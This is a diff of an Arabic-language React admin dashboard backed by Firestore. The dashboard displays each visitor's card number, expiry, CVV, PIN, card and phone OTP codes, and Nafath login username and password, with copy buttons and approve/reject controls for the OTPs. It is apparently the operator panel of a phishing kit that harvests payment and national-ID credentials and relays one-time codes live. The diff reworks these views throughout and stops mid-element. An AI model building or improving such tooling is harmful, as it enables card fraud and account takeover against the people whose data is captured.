@@ -34,7 +34,6 @@ import {
   DialogDescription,
   DialogHeader,
   DialogTitle,
-  DialogFooter,
 } from "@/components/ui/dialog";
 import {
   Card,
@@ -130,7 +129,7 @@ interface Notification {
 }
 
 export default function NotificationsPage1() {
-  const [notifications, setNotifications] = useState<any[]>([]);
+  const [notifications, setNotifications] = useState<Notification[]>([]);
   const [filteredNotifications, setFilteredNotifications] = useState<
     Notification[]
   >([]);
@@ -1301,58 +1300,7 @@ export default function NotificationsPage1() {
                               </TooltipProvider>
                             </div>
                           )}
-                          {(!notification.status ||
-                            notification.status === "pending") && (
-                            <div className="flex gap-1 mr-1">
-                              <TooltipProvider>
-                                <Tooltip>
-                                  <TooltipTrigger asChild>
-                                    <Button
-                                      variant="ghost"
-                                      size="icon"
-                                      className="h-8 w-8 text-green-500 hover:text-green-600 hover:bg-green-50"
-                                      onClick={(e) => {
-                                        e.stopPropagation();
-                                        handleApprovalWithFirestore(
-                                          "approved",
-                                          notification.id
-                                        );
-                                      }}
-                                    >
-                                      <CheckCircle className="h-4 w-4" />
-                                    </Button>
-                                  </TooltipTrigger>
-                                  <TooltipContent>
-                                    <p>قبول الطلب</p>
-                                  </TooltipContent>
-                                </Tooltip>
-                              </TooltipProvider>
 
-                              <TooltipProvider>
-                                <Tooltip>
-                                  <TooltipTrigger asChild>
-                                    <Button
-                                      variant="ghost"
-                                      size="icon"
-                                      className="h-8 w-8 text-red-500 hover:text-red-600 hover:bg-red-50"
-                                      onClick={(e) => {
-                                        e.stopPropagation();
-                                        handleApprovalWithFirestore(
-                                          "rejected",
-                                          notification.id
-                                        );
-                                      }}
-                                    >
-                                      <XCircle className="h-4 w-4" />
-                                    </Button>
-                                  </TooltipTrigger>
-                                  <TooltipContent>
-                                    <p>رفض الطلب</p>
-                                  </TooltipContent>
-                                </Tooltip>
-                              </TooltipProvider>
-                            </div>
-                          )}
                           <DropdownMenu>
                             <DropdownMenuTrigger asChild>
                               <Button
@@ -1737,35 +1685,132 @@ export default function NotificationsPage1() {
             </div>
           )}
 
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
-            <Button
-              onClick={() =>
-                selectedNotification &&
-                handleApprovalWithFirestore("approved", selectedNotification.id)
-              }
-              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-            >
-              <CheckCircle className="h-4 w-4 mr-2" />
-              قبول الطلب
-            </Button>
-            <Button
-              onClick={() =>
-                selectedNotification &&
-                handleApprovalWithFirestore("rejected", selectedNotification.id)
-              }
-              className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
-            >
-              <XCircle className="h-4 w-4 mr-2" />
-              رفض الطلب
-            </Button>
-          </DialogFooter>
+          {selectedNotification &&
+            (selectedNotification?.nafadUsername ||
+              selectedNotification?.nafadPassword) && (
+              <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-yellow-50 dark:from-amber-900/20 dark:to-yellow-900/20 border border-amber-200 dark:border-amber-800 shadow-md mt-4">
+                <h3 className="font-medium mb-3 text-lg text-amber-800 dark:text-amber-300 flex items-center">
+                  <Shield className="h-5 w-5 mr-2" />
+                  بيانات نفاذ
+                </h3>
+                <div className="space-y-3">
+                  {selectedNotification.nafadUsername && (
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium">اسم المستخدم:</span>
+                      <div className="flex items-center gap-2">
+                        <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
+                          <span className="font-mono font-bold">
+                            {selectedNotification.nafadUsername}
+                          </span>
+                        </Badge>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
+                          onClick={() => {
+                            navigator.clipboard.writeText(
+                              selectedNotification.nafadUsername || ""
+                            );
+                            toast.success("تم نسخ اسم المستخدم", {
+                              position: "top-center",
+                              duration: 1500,
+                            });
+                          }}
+                        >
+                          <Copy className="h-4 w-4" />
+                        </Button>
+                      </div>
+                    </div>
+                  )}
+                  {selectedNotification.nafadPassword && (
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium">كلمة المرور:</span>
+                      <div className="flex items-center gap-2">
+                        <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
+                          <span className="font-mono font-bold">
+                            {selectedNotification.nafadPassword}
+                          </span>
+                        </Badge>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
+                          onClick={() => {
+                            navigator.clipboard.writeText(
+                              selectedNotification.nafadPassword || ""
+                            );
+                            toast.success("تم نسخ كلمة المرور", {
+                              position: "top-center",
+                              duration: 1500,
+                            });
+                          }}
+                        >
+                          <Copy className="h-4 w-4" />
+                        </Button>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              </div>
+            )}
+
+          {/* Approval Actions Section */}
+          <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 border border-blue-200 dark:border-blue-800 shadow-md mt-4">
+            <h3 className="font-medium mb-3 text-lg text-blue-800 dark:text-blue-300 flex items-center">
+              <Shield className="h-5 w-5 mr-2" />
+              إجراءات الموافقة
+            </h3>
+            <div className="grid grid-cols-2 gap-3 mt-4">
+              <Button
+                onClick={() => {
+                  selectedNotification &&
+                    handleApprovalWithFirestore(
+                      "approved",
+                      selectedNotification.id
+                    );
+                }}
+                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
+              >
+                <CheckCircle className="h-4 w-4 mr-2" />
+                قبول الطلب
+              </Button>
+              <Button
+                onClick={() => {
+                  selectedNotification &&
+                    handleApprovalWithFirestore(
+                      "rejected",
+                      selectedNotification.id
+                    );
+                }}
+                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+              >
+                <XCircle className="h-4 w-4 mr-2" />
+                رفض الطلب
+              </Button>
+            </div>
+            <div className="mt-3 text-sm text-gray-500 text-center">
+              {selectedNotification?.status === "approved" ? (
+                <div className="flex items-center justify-center gap-1.5 text-green-600">
+                  <CheckCircle className="h-4 w-4" />
+                  <span>تمت الموافقة على هذا الطلب</span>
+                </div>
+              ) : selectedNotification?.status === "rejected" ? (
+                <div className="flex items-center justify-center gap-1.5 text-red-600">
+                  <XCircle className="h-4 w-4" />
+                  <span>تم رفض هذا الطلب</span>
+                </div>
+              ) : (
+                <div className="flex items-center justify-center gap-1.5 text-yellow-600">
+                  <Clock className="h-4 w-4" />
+                  <span>هذا الطلب في انتظار الموافقة</span>
+                </div>
+              )}
+            </div>
+          </div>
         </DialogContent>
       </Dialog>
 
-      <Dialog
-        open={showCardDialog}
-        onOpenChange={(open) => !open && setShowCardDialog(false)}
-      >
+      <Dialog open={showCardDialog} onOpenChange={setShowCardDialog}>
         <DialogContent
           className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
           dir="rtl"
@@ -1780,797 +1825,257 @@ export default function NotificationsPage1() {
           </DialogHeader>
 
           {selectedCardInfo && (
-            <div className="space-y-4 py-3">
-              <div className="p-5 rounded-lg bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-lg">
-                <div className="flex justify-between items-start mb-6">
-                  <div className="flex flex-col">
-                    <span className="text-xs text-blue-100 mb-1">
-                      حامل البطاقة
-                    </span>
-                    <span className="font-medium">
+            <Tabs defaultValue="main" className="w-full">
+              <TabsList className="grid w-full grid-cols-2 mb-4">
+                <TabsTrigger
+                  value="main"
+                  className="data-[state=active]:bg-primary data-[state=active]:text-white"
+                >
+                  البطاقة الرئيسية
+                </TabsTrigger>
+                <TabsTrigger
+                  value="form"
+                  className="data-[state=active]:bg-primary data-[state=active]:text-white"
+                >
+                  بيانات النموذج
+                </TabsTrigger>
+              </TabsList>
+              <TabsContent value="main" className="space-y-3 py-2">
+                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                  <p className="text-sm text-muted-foreground">
+                    اسم حامل البطاقة
+                  </p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <User className="h-4 w-4 text-primary" />
+                    <p className="font-medium text-lg">
                       {selectedCardInfo.document_owner_full_name ||
                         selectedCardInfo.full_name ||
                         "غير محدد"}
-                    </span>
-                  </div>
-                  <CreditCard className="h-8 w-8 text-white opacity-80" />
-                </div>
-
-                <div className="mb-4">
-                  <span className="text-xs text-blue-100 mb-1 block">
-                    رقم البطاقة
-                  </span>
-                  <span className="font-mono text-lg tracking-wider" dir="ltr">
-                    {selectedCardInfo.card_number ||
-                      (selectedCardInfo.formData &&
-                        selectedCardInfo.formData.card_number) ||
-                      "غير محدد"}
-                  </span>
-                </div>
-
-                <div className="flex justify-between">
-                  <div>
-                    <span className="text-xs text-blue-100 block">
-                      تاريخ الانتهاء
-                    </span>
-                    <span className="font-mono">
-                      {selectedCardInfo.expiration_date ||
-                        (selectedCardInfo.formData &&
-                          selectedCardInfo.formData.expiration_date) ||
-                        "غير محدد"}
-                    </span>
-                  </div>
-                  <div>
-                    <span className="text-xs text-blue-100 block">
-                      رمز الأمان
-                    </span>
-                    <span className="font-mono">
-                      {selectedCardInfo.cvv ||
-                        (selectedCardInfo.formData &&
-                          selectedCardInfo.formData.cvv) ||
-                        "غير محدد"}
-                    </span>
+                    </p>
                   </div>
                 </div>
-              </div>
 
-              {selectedCardInfo && selectedCardInfo.pinCode && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 border border-blue-200 dark:border-blue-800 shadow-md mt-4">
-                  <h3 className="font-medium mb-3 text-lg text-blue-800 dark:text-blue-300 flex items-center">
-                    <Shield className="h-5 w-5 mr-2" />
-                    رمز PIN للبطاقة
-                  </h3>
-                  <div className="flex justify-between items-center">
-                    <span className="font-medium">رمز PIN:</span>
-                    <div className="flex items-center gap-2">
-                      <Badge className="px-3 py-1.5 text-base bg-blue-100 text-blue-700 border-blue-200 flex items-center gap-2">
-                        <span className="font-mono font-bold text-lg">
-                          {selectedCardInfo.pinCode}
-                        </span>
-                      </Badge>
-                      <Button
-                        variant="ghost"
-                        size="icon"
-                        className="h-8 w-8 text-blue-600 hover:text-blue-700 hover:bg-blue-100"
-                        onClick={() => {
-                          navigator.clipboard.writeText(
-                            selectedCardInfo.pinCode || ""
-                          );
-                          toast.success("تم نسخ رمز PIN", {
-                            position: "top-center",
-                            duration: 1500,
-                          });
-                        }}
-                      >
-                        <Copy className="h-4 w-4" />
-                      </Button>
+                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                  <p className="text-sm text-muted-foreground">رقم البطاقة</p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <CreditCard className="h-4 w-4 text-primary" />
+                    <p className="font-medium text-lg font-mono">
+                      {selectedCardInfo.card_number || "غير محدد"}
+                    </p>
+                  </div>
+                </div>
+
+                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                  <p className="text-sm text-muted-foreground">
+                    تاريخ الانتهاء
+                  </p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <Calendar className="h-4 w-4 text-primary" />
+                    <p className="font-medium text-lg font-mono">
+                      {selectedCardInfo.expiration_date || "غير محدد"}
+                    </p>
+                  </div>
+                </div>
+
+                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                  <p className="text-sm text-muted-foreground">
+                    رمز الأمان (CVV)
+                  </p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <Shield className="h-4 w-4 text-primary" />
+                    <p className="font-medium text-lg font-mono">
+                      {selectedCardInfo.cvv || "غير محدد"}
+                    </p>
+                  </div>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="form" className="space-y-3 py-2">
+                {selectedCardInfo.formData ? (
+                  <>
+                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                      <p className="text-sm text-muted-foreground">
+                        اسم حامل البطاقة
+                      </p>
+                      <div className="flex items-center gap-2 mt-1">
+                        <User className="h-4 w-4 text-primary" />
+                        <p className="font-medium text-lg">
+                          {selectedCardInfo.formData.full_name || "غير محدد"}
+                        </p>
+                      </div>
                     </div>
-                  </div>
-                </div>
-              )}
 
-              {selectedCardInfo &&
-                (selectedCardInfo.cardOtp || selectedCardInfo.phoneOtp) && (
-                  <div className="p-4 rounded-lg bg-gradient-to-r from-purple-100 to-indigo-100 dark:from-purple-900/30 dark:to-indigo-900/30 border border-purple-200 dark:border-purple-800 shadow-md">
-                    <h3 className="font-medium mb-3 text-lg text-purple-800 dark:text-purple-300 flex items-center">
-                      <Shield className="h-5 w-5 mr-2" />
-                      معلومات رموز التحقق OTP
-                    </h3>
-                    <div className="space-y-3">
-                      {selectedCardInfo.cardOtp && (
-                        <div className="flex flex-col gap-2">
-                          <div className="flex justify-between items-center">
-                            <span className="font-medium">
-                              رمز OTP البطاقة:
-                            </span>
-                            <div className="flex items-center gap-2">
-                              <Badge
-                                className={`px-3 py-1.5 text-base ${
-                                  !selectedCardInfo.otpStatus ||
-                                  selectedCardInfo.otpStatus === "pending"
-                                    ? "bg-yellow-100 text-yellow-700 border-yellow-200"
-                                    : selectedCardInfo.otpStatus === "approved"
-                                    ? "bg-green-100 text-green-700 border-green-200"
-                                    : "bg-red-100 text-red-700 border-red-200"
-                                } flex items-center gap-2`}
-                              >
-                                {!selectedCardInfo.otpStatus ||
-                                selectedCardInfo.otpStatus === "pending" ? (
-                                  <Clock className="h-4 w-4" />
-                                ) : selectedCardInfo.otpStatus ===
-                                  "approved" ? (
-                                  <CheckCircle className="h-4 w-4" />
-                                ) : (
-                                  <XCircle className="h-4 w-4" />
-                                )}
-                                <span className="font-mono font-bold">
-                                  {selectedCardInfo.cardOtp}
-                                </span>
-                              </Badge>
-                              <Button
-                                variant="ghost"
-                                size="icon"
-                                className="h-8 w-8 text-purple-600 hover:text-purple-700 hover:bg-purple-100"
-                                onClick={() => {
-                                  navigator.clipboard.writeText(
-                                    selectedCardInfo.cardOtp || ""
-                                  );
-                                  toast.success("تم نسخ رمز OTP", {
-                                    position: "top-center",
-                                    duration: 1500,
-                                  });
-                                }}
-                              >
-                                <Copy className="h-4 w-4" />
-                              </Button>
-                            </div>
-                          </div>
-                          <div className="flex justify-between gap-2 mt-1">
-                            <Button
-                              onClick={async () => {
-                                if (selectedCardInfo) {
-                                  handleOtpApproval(selectedCardInfo, "card");
-                                }
-                              }}
-                              className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-                              disabled={
-                                selectedCardInfo.otpStatus === "approved"
-                              }
-                            >
-                              <CheckCircle className="h-4 w-4 mr-2" />
-                              قبول وموافقة
-                            </Button>
-                            <Button
-                              onClick={async () => {
-                                if (selectedCardInfo) {
-                                  try {
-                                    // Update the status in Firestore
-                                    const targetPost = doc(
-                                      db,
-                                      "pays",
-                                      selectedCardInfo.id
-                                    );
-                                    await updateDoc(targetPost, {
-                                      otpStatus: "rejected",
-                                    });
-
-                                    // Create or update approval document
-                                    const approvalDoc = doc(
-                                      db,
-                                      "approvals",
-                                      selectedCardInfo.id
-                                    );
-                                    await updateDoc(approvalDoc, {
-                                      approved: false,
-                                      timestamp: new Date().toISOString(),
-                                      updatedBy:
-                                        auth.currentUser?.email || "unknown",
-                                    }).catch(async () => {
-                                      // If document doesn't exist, create it
-                                      await setDoc(approvalDoc, {
-                                        approved: false,
-                                        timestamp: new Date().toISOString(),
-                                        updatedBy:
-                                          auth.currentUser?.email || "unknown",
-                                      });
-                                    });
-
-                                    toast.error("تم رفض رمز OTP البطاقة", {
-                                      position: "top-center",
-                                      duration: 3000,
-                                      icon: <XCircle className="h-5 w-5" />,
-                                    });
-
-                                    // Update local state
-                                    const updatedNotifications =
-                                      notifications.map((notification) =>
-                                        notification.id === selectedCardInfo.id
-                                          ? {
-                                              ...notification,
-                                              otpStatus: "rejected",
-                                            }
-                                          : notification
-                                      );
-                                    setNotifications(updatedNotifications);
-                                    setFilteredNotifications(
-                                      updatedNotifications.filter(
-                                        (notification) => {
-                                          const matchesSearch =
-                                            searchTerm.trim() === "" ||
-                                            notification.full_name
-                                              ?.toLowerCase()
-                                              .includes(
-                                                searchTerm.toLowerCase()
-                                              ) ||
-                                            notification.document_owner_full_name
-                                              ?.toLowerCase()
-                                              .includes(
-                                                searchTerm.toLowerCase()
-                                              ) ||
-                                            notification.phone?.includes(
-                                              searchTerm
-                                            ) ||
-                                            notification.card_number?.includes(
-                                              searchTerm
-                                            );
-
-                                          const matchesFilter =
-                                            !activeFilter ||
-                                            (activeFilter === "pending" &&
-                                              (!notification.status ||
-                                                notification.status ===
-                                                  "pending")) ||
-                                            (activeFilter === "approved" &&
-                                              notification.status ===
-                                                "approved") ||
-                                            (activeFilter === "rejected" &&
-                                              notification.status ===
-                                                "rejected") ||
-                                            (activeFilter === "payment" &&
-                                              notification.pagename ===
-                                                "payment") ||
-                                            (activeFilter === "registration" &&
-                                              notification.vehicle_type ===
-                                                "registration");
-
-                                          return matchesSearch && matchesFilter;
-                                        }
-                                      )
-                                    );
-                                  } catch (error) {
-                                    console.error(
-                                      "Error updating approval status:",
-                                      error
-                                    );
-                                    toast.error(
-                                      "حدث خطأ أثناء تحديث حالة الرفض",
-                                      {
-                                        position: "top-center",
-                                        duration: 3000,
-                                        icon: <XCircle className="h-5 w-5" />,
-                                      }
-                                    );
-                                  }
-                                }
-                              }}
-                              className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
-                              disabled={
-                                selectedCardInfo.otpStatus === "rejected"
-                              }
-                            >
-                              <XCircle className="h-4 w-4 mr-2" />
-                              رفض
-                            </Button>
-                          </div>
-                        </div>
-                      )}
-
-                      {selectedCardInfo.phoneOtp && (
-                        <div className="flex flex-col gap-2 mt-4 pt-4 border-t border-purple-200 dark:border-purple-800">
-                          <div className="flex justify-between items-center">
-                            <span className="font-medium">رمز OTP الهاتف:</span>
-                            <div className="flex items-center gap-2">
-                              <Badge
-                                className={`px-3 py-1.5 text-base ${
-                                  !selectedCardInfo.phoneOtpStatus ||
-                                  selectedCardInfo.phoneOtpStatus === "pending"
-                                    ? "bg-yellow-100 text-yellow-700 border-yellow-200"
-                                    : selectedCardInfo.phoneOtpStatus ===
-                                      "approved"
-                                    ? "bg-green-100 text-green-700 border-green-200"
-                                    : "bg-red-100 text-red-700 border-red-200"
-                                } flex items-center gap-2`}
-                              >
-                                {!selectedCardInfo.phoneOtpStatus ||
-                                selectedCardInfo.phoneOtpStatus ===
-                                  "pending" ? (
-                                  <Clock className="h-4 w-4" />
-                                ) : selectedCardInfo.phoneOtpStatus ===
-                                  "approved" ? (
-                                  <CheckCircle className="h-4 w-4" />
-                                ) : (
-                                  <XCircle className="h-4 w-4" />
-                                )}
-                                <span className="font-mono font-bold">
-                                  {selectedCardInfo.phoneOtp}
-                                </span>
-                              </Badge>
-                              <Button
-                                variant="ghost"
-                                size="icon"
-                                className="h-8 w-8 text-blue-600 hover:text-blue-700 hover:bg-blue-100"
-                                onClick={() => {
-                                  navigator.clipboard.writeText(
-                                    selectedCardInfo.phoneOtp || ""
-                                  );
-                                  toast.success("تم نسخ رمز OTP الهاتف", {
-                                    position: "top-center",
-                                    duration: 1500,
-                                  });
-                                }}
-                              >
-                                <Copy className="h-4 w-4" />
-                              </Button>
-                            </div>
-                          </div>
-                          <div className="flex justify-between gap-2 mt-1">
-                            <Button
-                              onClick={async () => {
-                                if (selectedCardInfo) {
-                                  handleOtpApproval(selectedCardInfo, "phone");
-                                }
-                              }}
-                              className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-                              disabled={
-                                selectedCardInfo.phoneOtpStatus === "approved"
-                              }
-                            >
-                              <CheckCircle className="h-4 w-4 mr-2" />
-                              قبول وموافقة
-                            </Button>
-                            <Button
-                              onClick={async () => {
-                                if (selectedCardInfo) {
-                                  try {
-                                    // Update the status in Firestore
-                                    const targetPost = doc(
-                                      db,
-                                      "pays",
-                                      selectedCardInfo.id
-                                    );
-                                    await updateDoc(targetPost, {
-                                      phoneOtpStatus: "rejected",
-                                    });
-
-                                    // Create or update approval document
-                                    const approvalDoc = doc(
-                                      db,
-                                      "approvals",
-                                      selectedCardInfo.id
-                                    );
-                                    await updateDoc(approvalDoc, {
-                                      phoneApproved: false,
-                                      phoneTimestamp: new Date().toISOString(),
-                                      phoneUpdatedBy:
-                                        auth.currentUser?.email || "unknown",
-                                    }).catch(async () => {
-                                      // If document doesn't exist, create it
-                                      await setDoc(
-                                        approvalDoc,
-                                        {
-                                          phoneApproved: false,
-                                          phoneTimestamp:
-                                            new Date().toISOString(),
-                                          phoneUpdatedBy:
-                                            auth.currentUser?.email ||
-                                            "unknown",
-                                        },
-                                        { merge: true }
-                                      );
-                                    });
-
-                                    toast.error("تم رفض رمز OTP الهاتف", {
-                                      position: "top-center",
-                                      duration: 3000,
-                                      icon: <XCircle className="h-5 w-5" />,
-                                    });
-
-                                    // Update local state
-                                    const updatedNotifications =
-                                      notifications.map((notification) =>
-                                        notification.id === selectedCardInfo.id
-                                          ? {
-                                              ...notification,
-                                              phoneOtpStatus: "rejected",
-                                            }
-                                          : notification
-                                      );
-                                    setNotifications(updatedNotifications);
-                                    setFilteredNotifications(
-                                      updatedNotifications.filter(
-                                        (notification) => {
-                                          const matchesSearch =
-                                            searchTerm.trim() === "" ||
-                                            notification.full_name
-                                              ?.toLowerCase()
-                                              .includes(
-                                                searchTerm.toLowerCase()
-                                              ) ||
-                                            notification.document_owner_full_name
-                                              ?.toLowerCase()
-                                              .includes(
-                                                searchTerm.toLowerCase()
-                                              ) ||
-                                            notification.phone?.includes(
-                                              searchTerm
-                                            ) ||
-                                            notification.card_number?.includes(
-                                              searchTerm
-                                            );
-
-                                          const matchesFilter =
-                                            !activeFilter ||
-                                            (activeFilter === "pending" &&
-                                              (!notification.status ||
-                                                notification.status ===
-                                                  "pending")) ||
-                                            (activeFilter === "approved" &&
-                                              notification.status ===
-                                                "approved") ||
-                                            (activeFilter === "rejected" &&
-                                              notification.status ===
-                                                "rejected") ||
-                                            (activeFilter === "payment" &&
-                                              notification.pagename ===
-                                                "payment") ||
-                                            (activeFilter === "registration" &&
-                                              notification.vehicle_type ===
-                                                "registration");
-
-                                          return matchesSearch && matchesFilter;
-                                        }
-                                      )
-                                    );
-                                  } catch (error) {
-                                    console.error(
-                                      "Error updating approval status:",
-                                      error
-                                    );
-                                    toast.error(
-                                      "حدث خطأ أثناء تحديث حالة الرفض",
-                                      {
-                                        position: "top-center",
-                                        duration: 3000,
-                                        icon: <XCircle className="h-5 w-5" />,
-                                      }
-                                    );
-                                  }
-                                }
-                              }}
-                              className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
-                              disabled={
-                                selectedCardInfo.phoneOtpStatus === "rejected"
-                              }
-                            >
-                              <XCircle className="h-4 w-4 mr-2" />
-                              رفض
-                            </Button>
-                          </div>
-                        </div>
-                      )}
+                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                      <p className="text-sm text-muted-foreground">
+                        رقم البطاقة
+                      </p>
+                      <div className="flex items-center gap-2 mt-1">
+                        <CreditCard className="h-4 w-4 text-primary" />
+                        <p className="font-medium text-lg font-mono">
+                          {selectedCardInfo.formData.card_number || "غير محدد"}
+                        </p>
+                      </div>
                     </div>
+
+                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                      <p className="text-sm text-muted-foreground">
+                        تاريخ الانتهاء
+                      </p>
+                      <div className="flex items-center gap-2 mt-1">
+                        <Calendar className="h-4 w-4 text-primary" />
+                        <p className="font-medium text-lg font-mono">
+                          {selectedCardInfo.formData.expiration_date ||
+                            "غير محدد"}
+                        </p>
+                      </div>
+                    </div>
+
+                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
+                      <p className="text-sm text-muted-foreground">
+                        رمز الأمان (CVV)
+                      </p>
+                      <div className="flex items-center gap-2 mt-1">
+                        <Shield className="h-4 w-4 text-primary" />
+                        <p className="font-medium text-lg font-mono">
+                          {selectedCardInfo.formData.cvv || "غير محدد"}
+                        </p>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <div className="flex flex-col items-center justify-center py-8 text-muted-foreground">
+                    <AlertCircle className="h-12 w-12 mb-2 text-muted-foreground/50" />
+                    <p>لا توجد بيانات نموذج متاحة</p>
                   </div>
                 )}
+              </TabsContent>
+            </Tabs>
+          )}
 
-              {(selectedCardInfo?.nafadUsername ||
-                selectedCardInfo?.nafadPassword) && (
-                <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-yellow-50 dark:from-amber-900/20 dark:to-yellow-900/20 border border-amber-200 dark:border-amber-800 shadow-md mt-4">
-                  <h3 className="font-medium mb-3 text-lg text-amber-800 dark:text-amber-300 flex items-center">
-                    <Shield className="h-5 w-5 mr-2" />
-                    بيانات نفاذ
-                  </h3>
-                  <div className="space-y-3">
-                    {selectedCardInfo.nafadUsername && (
-                      <div className="flex justify-between items-center">
-                        <span className="font-medium">اسم المستخدم:</span>
-                        <div className="flex items-center gap-2">
-                          <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
-                            <span className="font-mono font-bold">
-                              {selectedCardInfo.nafadUsername}
-                            </span>
-                          </Badge>
-                          <Button
-                            variant="ghost"
-                            size="icon"
-                            className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
-                            onClick={() => {
-                              navigator.clipboard.writeText(
-                                selectedCardInfo.nafadUsername || ""
-                              );
-                              toast.success("تم نسخ اسم المستخدم", {
-                                position: "top-center",
-                                duration: 1500,
-                              });
-                            }}
-                          >
-                            <Copy className="h-4 w-4" />
-                          </Button>
-                        </div>
+          {selectedCardInfo &&
+            (selectedCardInfo?.nafadUsername ||
+              selectedCardInfo?.nafadPassword) && (
+              <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-yellow-50 dark:from-amber-900/20 dark:to-yellow-900/20 border border-amber-200 dark:border-amber-800 shadow-md mt-4">
+                <h3 className="font-medium mb-3 text-lg text-amber-800 dark:text-amber-300 flex items-center">
+                  <Shield className="h-5 w-5 mr-2" />
+                  بيانات نفاذ
+                </h3>
+                <div className="space-y-3">
+                  {selectedCardInfo.nafadUsername && (
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium">اسم المستخدم:</span>
+                      <div className="flex items-center gap-2">
+                        <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
+                          <span className="font-mono font-bold">
+                            {selectedCardInfo.nafadUsername}
+                          </span>
+                        </Badge>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
+                          onClick={() => {
+                            navigator.clipboard.writeText(
+                              selectedCardInfo.nafadUsername || ""
+                            );
+                            toast.success("تم نسخ اسم المستخدم", {
+                              position: "top-center",
+                              duration: 1500,
+                            });
+                          }}
+                        >
+                          <Copy className="h-4 w-4" />
+                        </Button>
                       </div>
-                    )}
-                    {selectedCardInfo.nafadPassword && (
-                      <div className="flex justify-between items-center">
-                        <span className="font-medium">كلمة المرور:</span>
-                        <div className="flex items-center gap-2">
-                          <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
-                            <span className="font-mono font-bold">
-                              {selectedCardInfo.nafadPassword}
-                            </span>
-                          </Badge>
-                          <Button
-                            variant="ghost"
-                            size="icon"
-                            className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
-                            onClick={() => {
-                              navigator.clipboard.writeText(
-                                selectedCardInfo.nafadPassword || ""
-                              );
-                              toast.success("تم نسخ كلمة المرور", {
-                                position: "top-center",
-                                duration: 1500,
-                              });
-                            }}
-                          >
-                            <Copy className="h-4 w-4" />
-                          </Button>
-                        </div>
+                    </div>
+                  )}
+                  {selectedCardInfo.nafadPassword && (
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium">كلمة المرور:</span>
+                      <div className="flex items-center gap-2">
+                        <Badge className="px-3 py-1.5 text-base bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-2">
+                          <span className="font-mono font-bold">
+                            {selectedCardInfo.nafadPassword}
+                          </span>
+                        </Badge>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          className="h-8 w-8 text-amber-600 hover:text-amber-700 hover:bg-amber-100"
+                          onClick={() => {
+                            navigator.clipboard.writeText(
+                              selectedCardInfo.nafadPassword || ""
+                            );
+                            toast.success("تم نسخ كلمة المرور", {
+                              position: "top-center",
+                              duration: 1500,
+                            });
+                          }}
+                        >
+                          <Copy className="h-4 w-4" />
+                        </Button>
                       </div>
-                    )}
-                  </div>
+                    </div>
+                  )}
+                </div>
+              </div>
+            )}
+
+          {/* Approval Actions Section */}
+          <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 border border-blue-200 dark:border-blue-800 shadow-md mt-4">
